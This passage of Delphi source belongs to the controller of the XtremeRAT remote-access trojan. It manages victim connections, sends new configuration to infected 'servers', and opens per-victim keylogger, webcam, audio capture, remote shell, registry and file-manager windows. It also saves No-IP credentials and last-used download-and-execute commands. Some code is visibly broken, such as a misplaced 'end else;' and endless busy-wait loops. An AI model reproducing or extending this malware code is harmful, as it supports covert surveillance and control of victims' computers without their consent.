  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := 'ServerConfig.cfg';
  OpenDialog1.Filter := 'Xtreme Server Config(*.cfg)|*.cfg';
  if OpenDialog1.Execute = false then exit;

  ConfigFile := OpenDialog1.FileName;
  Size := LerArquivo(pWideChar(ConfigFile), p);

  SetLength(TempStr, Size div 2);
  CopyMemory(@TempStr[1], p, Size);

  if MessageBox(Handle,
                pchar(Traduzidos[576]),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
  ToSend := CHANGESERVERSETTINGS + '|' + 'Y' + '|' +TempStr else
  ToSend := CHANGESERVERSETTINGS + '|' + 'N' + '|' + TempStr;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(ToSend);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.AbrirMSN(ConAux: TConexaoNew);
var
  NovaJanelaMSN: TFormMSN;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormMSN <> nil then
  begin
    if TFormMSN(ConAux.FormMSN).Visible then
    begin
      TFormMSN(ConAux.FormMSN).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormMSN(ConAux.FormMSN).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormMSN(ConAux.FormMSN).Align := alClient;
      TFormMSN(ConAux.FormMSN).BorderStyle := bsNone;
    end else
    begin
      TFormMSN(ConAux.FormMSN).Parent := nil;
      TFormMSN(ConAux.FormMSN).Align := alNone;
      TFormMSN(ConAux.FormMSN).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaMSN := TFormMSN.Create(self, ConAux);
    ConAux.FormMSN := NovaJanelaMSN;
    NovaJanelaMSN.Caption := traduzidos[534] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormMSN(ConAux.FormMSN).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormMSN(ConAux.FormMSN).Align := alClient;
      TFormMSN(ConAux.FormMSN).BorderStyle := bsNone;
    end else
    begin
      TFormMSN(ConAux.FormMSN).Parent := nil;
      TFormMSN(ConAux.FormMSN).Align := alNone;
      TFormMSN(ConAux.FormMSN).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormMSN(ConAux.FormMSN).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormMSN(ConAux.FormMSN).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormMSN(ConAux.FormMSN).Caption := traduzidos[534] + ' (' + ConAux.NomeDoServidor + ')';
  TFormMSN(ConAux.FormMSN).Show;
end;

procedure TFormMain.MSN1Click(Sender: TObject);
var
  NovaJanelaMSN: TFormMSN;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirMSN(ConAux);
end;

procedure TFormMain.Mudardegrupo1Click(Sender: TObject);
var
  i: integer;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  Name: string;
begin
  application.ProcessMessages;
  name := LastGroupName;
  if inputquery(pwidechar(traduzidos[168]), pwidechar(traduzidos[170]), name) = false then exit;
  if CheckValidName(Name) = False then Exit;
  LastGroupName := Name;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(CHANGEGROUP + DelimitadorComandos + Name);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.NoIP1Click(Sender: TObject);
var
  resStream: TResourceStream;
  JPG: TJpegImage;
begin
  JPG := TJpegImage.Create;
  resStream := TResourceStream.Create(hInstance, 'NOIP', 'noipfile');
  JPG.LoadFromStream(resStream);
  resStream.Free;

  Application.CreateForm(TFormUpdateIP, FormUpdateIP);
  FormUpdateIP.Image1.Picture.Bitmap.Assign(JPG);
  JPG.Free;

  FormUpdateIP.Caption := Traduzidos[577] + ' (No-IP)';
  FormUpdateIP.Label1.Caption := Traduzidos[578] + ':';
  FormUpdateIP.Label2.Caption := Traduzidos[579] + ':';
  FormUpdateIP.Label3.Caption := Traduzidos[580] + ':';
  FormUpdateIP.Label4.Caption := Traduzidos[581] + ':';
  FormUpdateIP.CheckBox1.Caption := Traduzidos[47];
  FormUpdateIP.Button2.Caption := Traduzidos[120];

  FormUpdateIP.Edit1.Text := '127.0.0.1';
  FormUpdateIP.Edit2.Text := NoIPHost;
  FormUpdateIP.Edit3.Text := NoIPUser;
  FormUpdateIP.Edit4.Text := NoIPPass;

  if FormUpdateIP.ShowModal = mrOK then
  try
    FormUpdateIP.NoIPUpdate(FormUpdateIP.Edit2.Text,
                            FormUpdateIP.Edit3.Text,
                            FormUpdateIP.Edit4.Text,
                            FormUpdateIP.Edit1.Text);
    finally
    if MessageBox(Handle,
                  pchar(Traduzidos[582] + '?'),
                  pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                  MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
    begin
      NoIPHost := FormUpdateIP.Edit2.Text;
      NoIPUser := FormUpdateIP.Edit3.Text;
      NoIPPass := FormUpdateIP.Edit4.Text;
    end;
    FormUpdateIP.Release;
    FormUpdateIP := nil;
  end;
end;

procedure TFormMain.Conexo1Click(Sender: TObject);
var
  i: integer;
  localip: string;
begin
  Application.CreateForm(TFormSelectPort, FormSelectPort);
  FormSelectPort.Caption := Traduzidos[142];
  FormSelectPort.Label1.Caption := Traduzidos[44];
  FormSelectPort.CheckBox1.Caption := Traduzidos[47];
  FormSelectPort.ListView1.Column[0].Caption := Traduzidos[40];
  FormSelectPort.SpeedButton1.Hint := Traduzidos[137];
  FormSelectPort.SpeedButton2.Hint := Traduzidos[138];
  FormSelectPort.SpeedButton3.Hint := Traduzidos[139];
  FormSelectPort.CheckBox2.checked := UseUPnP;

  try
    if FormSelectPort.ShowModal = mrOK then
    begin
      ConnectionPass := StrToInt(FormSelectPort.Edit1.Text);

      if UseUPnP <> FormSelectPort.CheckBox2.Checked then
      begin
        localip := GetIPAddress;
        UseUPnP := FormSelectPort.CheckBox2.Checked;
        for i := 0 to FormSelectPort.ListView1.Items.Count - 1 do
        if UseUPnP then AddUPnPEntry(localip, StrToInt(FormSelectPort.ListView1.Items.Item[i].Caption), 'XtremeRAT') else
        DeleteUPnPEntry(StrToInt(FormSelectPort.ListView1.Items.Item[i].Caption));
      end;
    end;
    finally
    FormSelectPort.Release;
    FormSelectPort := nil;
    AtualizarIdiomas;
  end;
end;

procedure TFormMain.Configuraes1Click(Sender: TObject);
var
  CC: integer;
  localip: string;
  resStream: TResourceStream;
  Repaint: boolean;
  Node: pVirtualNode;
  ConAux: TConexaoNew;
begin
  Application.CreateForm(TFormSettings, FormSettings);

  FormSettings.Caption := Traduzidos[151];

  FormSettings.sSpeedButton1.Hint := Traduzidos[152];
  FormSettings.sSpeedButton2.Caption := Traduzidos[139];
  FormSettings.CheckBox1.Caption := Traduzidos[153];
  FormSettings.CheckBox2.Caption := Traduzidos[154];
  FormSettings.CheckBox3.Caption := Traduzidos[155];
  FormSettings.CheckBox4.Caption := Traduzidos[156];
  FormSettings.CheckBox5.Caption := Traduzidos[157] + ' (Mouse)';

  FormSettings.CheckBox6.Caption := Traduzidos[476];
  FormSettings.CheckBox7.Caption := Traduzidos[477];
  FormSettings.CheckBox8.Caption := Traduzidos[478];

  FormSettings.RadioGroup1.Caption := Traduzidos[159];
  FormSettings.RadioGroup1.Items.Strings[0] := Traduzidos[160];
  FormSettings.RadioGroup1.Items.Strings[1] := Traduzidos[161];
  FormSettings.RadioGroup1.Items.Strings[2] := Traduzidos[162];

  FormSettings.sStickyLabel1.Caption := Traduzidos[158] + ':  ';
  FormSettings.sStickyLabel2.Caption := 'Thumbs (' + Traduzidos[158] + '):  ';
  FormSettings.sStickyLabel3.Caption := Traduzidos[586] + ': ';
  FormSettings.sStickyLabel4.Caption := Traduzidos[587] + ': ';

  FormSettings.RadioGroup2.Caption := Traduzidos[601];
  FormSettings.RadioGroup2.Items.Strings[0] := Traduzidos[602];
  FormSettings.RadioGroup2.Items.Strings[1] := Traduzidos[597];

  FormSettings.UpDown1.Position := DesktopSize;
  FormSettings.UpDown2.Position := ThumbSize;
  FormSettings.RadioGroup1.ItemIndex := FlagSize;

  FormSettings.ColorBox1.DefaultColorColor := PingColor;
  FormSettings.ColorBox2.DefaultColorColor := MainColor;
  FormSettings.ColorBox1.Selected := PingColor;
  FormSettings.ColorBox2.Selected := MainColor;

  if fileexists(SoundFile) = False then
  begin
    SoundFile := ExtractFilePath(paramstr(0)) + 'sound.wav';
    resStream := TResourceStream.Create(hInstance, 'SOUND', 'soundfile');
    resStream.SaveToFile(SoundFile);
    resStream.Free;
  end;

  FormSettings.OpenDialog1.FileName := SoundFile;
  FormSettings.OpenDialog1.InitialDir := ExtractFilePath(SoundFile);
  FormSettings.Edit1.Text := SoundFile;
  FormSettings.OpenDialog1.Filter := 'Sound files (*.wav)|*.wav';

  Habilitar1.Checked := EnabledSkin;
  FormSettings.CheckBox1.checked := VNotify;
  FormSettings.CheckBox2.checked := SNotify;
  FormSettings.CheckBox3.checked := CloseToSysTray;
  FormSettings.CheckBox4.checked := MinimizeToSysTray;
  FormSettings.CheckBox5.Checked := ShowDeskPreview;

  FormSettings.CheckBox6.Checked := AutoDesktop;
  FormSettings.CheckBox7.Checked := AutoWebcam;
  FormSettings.CheckBox8.Checked := AutoAudio;
  FormSettings.CheckBox9.Checked := AutoOpenWebcam;
  if ControlCenter = False then
  FormSettings.RadioGroup2.ItemIndex := 0 else FormSettings.RadioGroup2.ItemIndex := 1;
  CC := FormSettings.RadioGroup2.ItemIndex;

  try
    if FormSettings.ShowModal = mrOK then
    begin
      SoundFile := FormSettings.Edit1.Text;
      VNotify := FormSettings.CheckBox1.checked;
      SNotify := FormSettings.CheckBox2.checked;
      CloseToSysTray := FormSettings.CheckBox3.checked;
      MinimizeToSysTray := FormSettings.CheckBox4.checked;
      ShowDeskPreview := FormSettings.CheckBox5.Checked;
      DesktopSize := FormSettings.UpDown1.Position;
      ThumbSize := FormSettings.UpDown2.Position;
      AutoDesktop := FormSettings.CheckBox6.Checked;
      AutoWebcam := FormSettings.CheckBox7.Checked;
      AutoAudio := FormSettings.CheckBox8.Checked;
      AutoOpenWebcam := FormSettings.CheckBox9.Checked;
      if ThumbSize <> DesktopImageList.Height then
      begin
        DesktopImageList.Clear;
        DesktopImageList.Height := ThumbSize;
        DesktopImageList.Width := ThumbSize;
        if ShowThumbPreview then ChangeImageList(DesktopImageList);
      end;

      if (FormSettings.RadioGroup1.ItemIndex <> FlagSize) and (ShowThumbPreview = False) then
      begin
        FlagSize := FormSettings.RadioGroup1.ItemIndex;
        if FormSettings.RadioGroup1.ItemIndex = 0 then
        begin
          if MainList.Images <> Flags16 then ChangeImageList(Flags16);
        end else
        if FormSettings.RadioGroup1.ItemIndex = 1 then
        begin
          if MainList.Images <> Flags24 then ChangeImageList(Flags24);
        end else
        if FormSettings.RadioGroup1.ItemIndex = 2 then
        begin
          if MainList.Images <> Flags32 then ChangeImageList(Flags32);
        end;
      end;

      if CC <> FormSettings.RadioGroup2.ItemIndex then
      begin
        if MessageBox(Handle,
                      pchar(Traduzidos[598] + '?'{Todas as janelas serão fechadas. Deseja continuar?}),
                      pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                      MB_YESNO or MB_ICONINFORMATION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
        begin
          if FormSettings.RadioGroup2.ItemIndex = 0 then ControlCenter := False else
          ControlCenter := True;

          Node := MainList.GetFirst;
          while Assigned(Node) do
          begin
            ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
            CheckForms(ConAux);
            ConAux.FormProcessos := nil;
            ConAux.FormWindows := nil;
            ConAux.FormServices := nil;
            ConAux.FormRegedit := nil;
            ConAux.FormShell := nil;
            ConAux.FormFileManager := nil;
            ConAux.FormClipboard := nil;
            ConAux.FormListarDispositivos := nil;
            ConAux.FormActivePorts := nil;
            ConAux.FormProgramas := nil;
            ConAux.FormDiversos := nil;
            ConAux.FormDesktop := nil;
            ConAux.FormWebcam := nil;
            ConAux.FormAudioCapture := nil;
            ConAux.FormCHAT := nil;
            ConAux.FormKeylogger := nil;
            ConAux.FormServerSettings := nil;
            ConAux.FormMSN := nil;
            //ConAux.FormAll := nil; //Nunca deixar nil.
            Node := MainList.GetNext(Node);
          end;
        end;
      end;
    end;
    finally
    FormSettings.Release;
    FormSettings := nil;
  end;
end;

procedure TFormMain.Configuraesdoservidor1Click(Sender: TObject);
var
  NovaJanelaServerSettings: TFormServerSettings;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);

  if ConAux.FormServerSettings <> nil then
  begin
    if TFormServerSettings(ConAux.FormServerSettings).Visible then
    begin
      TFormServerSettings(ConAux.FormServerSettings).BringToFront;
      Exit;
    end;

    TFormServerSettings(ConAux.FormServerSettings).Caption := traduzidos[531] + ' (' + ConAux.NomeDoServidor + ')';
    TFormServerSettings(ConAux.FormServerSettings).Show;
  end else
  begin
    NovaJanelaServerSettings := TFormServerSettings.Create(self, ConAux);
    ConAux.FormServerSettings := NovaJanelaServerSettings;
    NovaJanelaServerSettings.Caption := traduzidos[531] + ' (' + ConAux.NomeDoServidor + ')';
    NovaJanelaServerSettings.Show;
  end;
end;

procedure TFormMain.Contatos1Click(Sender: TObject);
begin
  FormAbout.ShowModal;
end;

procedure TFormMain.Controlcenter1Click(Sender: TObject);
var
  NovaJanelaAll: TFormAll;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);

  if ConAux.FormAll <> nil then
  begin
    if TFormAll(ConAux.FormAll).Visible then
    begin
      TFormAll(ConAux.FormAll).BringToFront;
      Exit;
    end;

    TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
    TFormAll(ConAux.FormAll).Show;
  end else
  begin
    NovaJanelaAll := TFormAll.Create(self, ConAux);
    ConAux.FormAll := NovaJanelaAll;
    NovaJanelaAll.Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
    NovaJanelaAll.Show;
  end;
end;

function TFormMain.GetNodeGroup(ConAux: TConexaoNew): PVirtualNode;
var
  i: integer;
  TempConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  Result := nil;

  Node := MainList.GetFirst;
  while Assigned(Node) do
  begin
    if (pConexaoNew(MainList.GetNodeData(Node))^.GroupName = ConAux.GroupName) and
       (MainList.GetNodeLevel(node) = 0) then
    begin
      Result := Node;
      Break;
    end else
    Node := MainList.GetNext(Node);
  end;

  if Result = nil then
  begin
    TempConAux := TConexaoNew.Create(nil, nil);
    TempConAux.GroupName := ConAux.GroupName;
    TempConAux.FontColor := MainColor;
    TempConAux.MasterIdentification := 11111;
    Result := MainList.AddChild(nil, TObject(TempConAux));
    MainList.Expanded[Result] := True;
    MainList.Refresh;
  end;

end;

procedure TFormMain.Habilitar1Click(Sender: TObject);
begin
  Habilitar1.Checked := not Habilitar1.Checked;
  EnabledSkin := Habilitar1.Checked;
  Selecionar1.Enabled := Habilitar1.Checked;

  if EnabledSkin = True then
  begin
    sSkinManager1.InstallHook;
    sSkinManager1.Active := True;
    Application.ProcessMessages;

    Application.CreateForm(TFormUpdateSkin, FormUpdateSkin);
    try
      FormUpdateSkin.Show;
      finally
      FormUpdateSkin.Close;
      FormUpdateSkin.Release;
      FormUpdateSkin := nil;
    end;

    while True do
    begin
      sleep(5);
      Application.ProcessMessages;
    end;
  end else;
  begin
    sSkinManager1.UnInstallHook;
    sSkinManager1.Active := False;
    Application.ProcessMessages;

    while True do
    begin
      sleep(5);
      Application.ProcessMessages;
    end;
  end;

end;

procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction);
var
  IniFile: TIniFile;
  i: integer;
  b: boolean;
  TempStr: string;
  Stream: TMemoryStream;
begin
  ForceDirectories(ExtractFilePath(SettingsFile));
  IniFile := TIniFile.Create(SettingsFile, IniFilePassword);
  IniFile.WriteString('settings', 'Lang', UnicodeToAnsi(LangFile, CP_UTF8, False));
  IniFile.WriteString('settings', 'SoundFile', UnicodeToAnsi(SoundFile, CP_UTF8, False));
  IniFile.WriteString('settings', 'Skin', UnicodeToAnsi(SkinName, CP_UTF8, False));
  IniFile.WriteInteger('settings', 'SkinHUE', SkinHUE);
  IniFile.WriteInteger('settings', 'SkinSaturation', SkinSaturation);
  IniFile.WriteDateTime('settings', 'MinDate', MinDate);

  IniFile.WriteInteger('settings', 'Width', Width);
  IniFile.WriteInteger('settings', 'Height', Height);

  for I := 0 to MainList.Header.Columns.Count - 1 do
  begin
    IniFile.WriteInteger('settings', 'Column' + inttostr(i) + 'Position', MainList.Header.Columns.Items[i].Position);
    IniFile.WriteInteger('settings', 'Column' + inttostr(i) + 'Width', MainList.Header.Columns.Items[i].Width);

    b := coVisible in MainList.Header.Columns.Items[i].Options;
    IniFile.WriteBool('settings', 'Column' + inttostr(i) + 'Visible', b);
  end;

  IniFile.WriteBool('settings', 'UseUPnP', UseUPnP);
  IniFile.WriteInteger('settings', 'ConnectionPass', ConnectionPass);
  IniFile.WriteBool('settings', 'CloseToSysTray', CloseToSysTray);
  IniFile.WriteBool('settings', 'MinimizeToSysTray', MinimizeToSysTray);
  IniFile.WriteBool('settings', 'VNotify', VNotify);
  IniFile.WriteBool('settings', 'EnabledSkin', EnabledSkin);
  IniFile.WriteBool('settings', 'SNotify', SNotify);
  IniFile.WriteBool('settings', 'ShowDeskPreview', ShowDeskPreview);
  IniFile.WriteBool('settings', 'ShowThumbPreview', ShowThumbPreview);
  IniFile.WriteBool('settings', 'AutoDesktop', AutoDesktop);
  IniFile.WriteBool('settings', 'AutoWebcam', AutoWebcam);
  IniFile.WriteBool('settings', 'AutoAudio', AutoAudio);
  IniFile.WriteBool('settings', 'AutoOpenWebcam', AutoOpenWebcam);
  IniFile.WriteBool('settings', 'ShowInfoPanel', sFrameBar1.Visible);
  IniFile.WriteBool('settings', 'ControlCenter', ControlCenter);

  IniFile.WriteInteger('settings', 'DesktopSize', DesktopSize);
  IniFile.WriteInteger('settings', 'ThumbSize', ThumbSize);
  IniFile.WriteInteger('settings', 'FlagSize', FlagSize);
  IniFile.WriteInteger('settings', 'ImageHeight', Image1.Height);
  IniFile.WriteInteger('settings', 'ImageWidth', sFrameBar1.Width);

  IniFile.WriteInteger('settings', 'PingColor', PingColor);
  IniFile.WriteInteger('settings', 'MainColor', MainColor);

  IniFile.WriteString('settings', 'LastReconnectIP', UnicodeToAnsi(LastReconnectIP, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastGroupName', UnicodeToAnsi(LastGroupName, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastRenameName', UnicodeToAnsi(LastRenameName, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastUpdateLink', UnicodeToAnsi(LastUpdateLink, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastExecuteCommand', UnicodeToAnsi(LastExecuteCommand, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastDownExec', UnicodeToAnsi(LastDownExec, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastOpenWeb', UnicodeToAnsi(LastOpenWeb, CP_UTF8, False));

  IniFile.WriteString('settings', 'LastChatClient', UnicodeToAnsi(LastChatClient, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastChatServer', UnicodeToAnsi(LastChatServer, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastWindowTitle', UnicodeToAnsi(LastWindowTitle, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastKeySearch', UnicodeToAnsi(LastKeySearch, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastFileSearch', UnicodeToAnsi(LastFileSearch, CP_UTF8, False));
  IniFile.WriteString('settings', 'LastProxyPort', UnicodeToAnsi(LastProxyPort, CP_UTF8, False));

  IniFile.WriteString('settings', 'DynDNSHost', UnicodeToAnsi(DynDNSHost, CP_UTF8, False));
  IniFile.WriteString('settings', 'DynDNSUser', UnicodeToAnsi(DynDNSUser, CP_UTF8, False));
  IniFile.WriteString('settings', 'DynDNSPass', UnicodeToAnsi(DynDNSPass, CP_UTF8, False));

  IniFile.WriteString('settings', 'NoIPHost', UnicodeToAnsi(NoIPHost, CP_UTF8, False));
  IniFile.WriteString('settings', 'NoIPUser', UnicodeToAnsi(NoIPUser, CP_UTF8, False));
  IniFile.WriteString('settings', 'NoIPPass', UnicodeToAnsi(NoIPPass, CP_UTF8, False));

  TempStr := '';
  for i := 1 to 65535 do
    if IdTCPServers[i] <> nil then
      TempStr := TempStr + inttostr(i) + '|';
  IniFile.WriteString('settings', 'port', UnicodeToAnsi(TempStr, CP_UTF8, False));

  IniFile.Free;

  ForceDirectories(ConnLogsDir);
  TempStr := ConnLogsDir + MD5Print(MD5String(Today));
  for I := 0 to TempListViewLogs.Items.Count - 1 do
  if TempListViewLogs.Items.Item[i].SubItems.Strings[1] = '' then
  TempListViewLogs.Items.Item[i].SubItems.Strings[1] := 'CLOSED';

  Stream := TMemoryStream.Create;
  SaveComponentToStream(Stream, TempListViewLogs);
  Stream.Position := 0;
  Stream.SaveToFile(TempStr);
  Stream.Free;

  //for i := 0 to High(IdTCPServers) do
  //if IdTCPServers[i] <> nil then DesativarPorta(i);

  BTMemoryFreeLibrary(MemoryModule);
  Exitprocess(0);
end;

procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  if ForcarSaida = True then
  begin
    CanClose := True;
    Exit;
  end;

  CanClose := False;
  if CloseToSysTray = True then
  begin
    FormMain.Hide;
    TrayIcon1.Visible := True;
    TrayIcon1.BalloonTitle := NomeDoPrograma + ' ' + VersaoDoPrograma;
    TrayIcon1.BalloonHint := traduzidos[25] + ' [' + inttostr
      (MainList.TotalCount - MainList.RootNodeCount) + ']';
    TrayIcon1.BalloonFlags := bfInfo;
    TrayIcon1.ShowBalloonHint;
    Application.ProcessMessages;
  end else CanClose := True;
end;

function FileIconInit(FullInit: BOOL): BOOL; stdcall;
type
  TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
var
  PFileIconInit: TFileIconInit;
  ShellDLL: integer;
begin
  //this forces winNT to load all the icons

  Result := False;
  if (Win32Platform = VER_PLATFORM_WIN32_NT) then
  begin
    ShellDLL := LoadLibrary('Shell32.dll');
    PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
    if (Assigned(PFileIconInit)) then Result := PFileIconInit(FullInit);
  end;
end;

procedure TFormMain.FormCreate(Sender: TObject);
var
  i: integer;
  MI, MISub: TMenuItem;
  IniFile: TIniFile;
  resStream: TResourceStream;
  b: boolean;
  PopupImg: TJpegImage;
  TempBitmap: TBitmap;
  SHFileInfo: TSHFileInfo;
begin
  GIdDefaultTextEncoding := encUTF8;
  OldBitmapCount := ImageListDiversos.Count;
  TempBitmap := TBitmap.Create;
  for i := 0 to 243 do //Total de bandeiras...
  begin
    Flags16.GetBitmap(i, TempBitmap);
    ImageListDiversos.Add(TempBitmap, nil);
  end;
  TempBitmap.Free;

  FileIconInit(True);
  SuperImageList := TImageList.CreateSize(16, 16);
  SuperImageList.ShareImages := True;
  SuperImageList.Handle := SHGetFileInfo('', FILE_ATTRIBUTE_NORMAL, SHFileInfo,
    SizeOf(SHFileInfo), SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);

  FileManagerIcon[0] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(6, false));
  FileManagerIcon[1] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(8, false));
  FileManagerIcon[2] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(9, false));
  FileManagerIcon[3] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(177, false));
  FileManagerIcon[4] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(3, false));
  FileManagerIcon[5] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(3, false));
  FileManagerIcon[6] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(15, false));
  FileManagerIcon[7] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(10, false));
  FileManagerIcon[8] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(12, false));
  FileManagerIcon[9] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(17, false));
  FileManagerIcon[10] := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(18, false));
  FileManagerUnknownIcon := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(0, false));
  for I := 0 to High(FileManagerSpecialIcons) do
  begin
    try
      FileManagerSpecialIcons[i] := ImageList_AddIcon(SuperImageList.Handle, GetSpecialIcon(TRootSpecial(i), false));
      except
      FileManagerSpecialIcons[i] := FileManagerUnknownIcon;
    end;
  end;
  FileManagerFolderIcon := ImageList_AddIcon(SuperImageList.Handle, ExtractShellIcon(3, false));

  MaxConnectionHttp := 0;
  PossoMostrar := True;

  if sFrameBar1.Visible then BarSpeedButton.Caption := sCloseBar else
  BarSpeedButton.Caption := sOpenBar;

  FormMain.Left := (screen.width - FormMain.width) div 2 ;
  FormMain.top := (screen.height - FormMain.height) div 2;

  NoErrMsg := True;
  SetErrorMode(SEM_FAILCRITICALERRORS or SEM_NOALIGNMENTFAULTEXCEPT or
      SEM_NOGPFAULTERRORBOX or SEM_NOOPENFILEERRORBOX);

  Application.OnShowHint := OnShowHint;
  Application.OnException := OnException;

  resStream := TResourceStream.Create(hInstance, 'IMGPOPUP', 'imgpopup');
  PopupImg := TJpegImage.Create;
  PopupImg.LoadFromStream(resStream);
  resStream.Free;
  MSN := TMSNPopup.Create(nil);
  MSN.TimeOut := 5;
  MSN.ScrollSpeed := 20;
  MSN.BackgroundImage.Width := PopupImg.Width;
  MSN.BackgroundImage.Height := PopupImg.Height;
  MSN.BackgroundImage.Assign(PopupImg);
  MSN.Width := MSN.BackgroundImage.Width;
  MSN.Height := MSN.BackgroundImage.Height;

  MSN.TitleFont.Color := clYellow;
  MSN.TitleFont.Height := -16;
  MSN.TitleFont.Name := 'Lucida Fax';
  MSN.TitleFont.Style := [fsBold];
  MSN.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;

  MSN.Font.Color := clYellow;
  MSN.Font.Height := -13;
  MSN.Font.Name := 'Lucida Fax';

  PopupImg.Free;

  resStream := TResourceStream.Create(hInstance, 'IMGDISCONNECT', 'imgdisconnect');
  PopupImg := TJpegImage.Create;
  PopupImg.LoadFromStream(resStream);
  resStream.Free;
  ConnectionClossed := TMSNPopup.Create(nil);
  ConnectionClossed.AlphaBlend := True;
  ConnectionClossed.AlphaBlendValue := 200;
  ConnectionClossed.TimeOut := 5;
  ConnectionClossed.ScrollSpeed := 50;
  ConnectionClossed.BackgroundImage.Width := PopupImg.Width;
  ConnectionClossed.BackgroundImage.Height := PopupImg.Height;
  ConnectionClossed.BackgroundImage.Assign(PopupImg);
  ConnectionClossed.Width := MSN.BackgroundImage.Width;
  ConnectionClossed.Height := MSN.BackgroundImage.Height;
  ConnectionClossed.PopupStartX := ConnectionClossed.PopupStartX + ConnectionClossed.Width;

  ConnectionClossed.TitleFont.Color := clBlue;
  ConnectionClossed.TitleFont.Height := -16;
  ConnectionClossed.TitleFont.Name := 'Lucida Fax';
  ConnectionClossed.TitleFont.Style := [fsBold];
  ConnectionClossed.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;

  ConnectionClossed.Font.Color := clBlue;
  ConnectionClossed.Font.Height := -13;
  ConnectionClossed.Font.Name := 'Lucida Fax';

  PopupImg.Free;




















  ForcarSaida := False;

  ConvertToHighColor(Flags16);
  ConvertToHighColor(Flags24);
  ConvertToHighColor(Flags32);

  IdiomasFilesDir := ExtractFilePath(Paramstr(0)) + 'Language\';
  LangFile := IdiomasFilesDir + 'Português.ini';
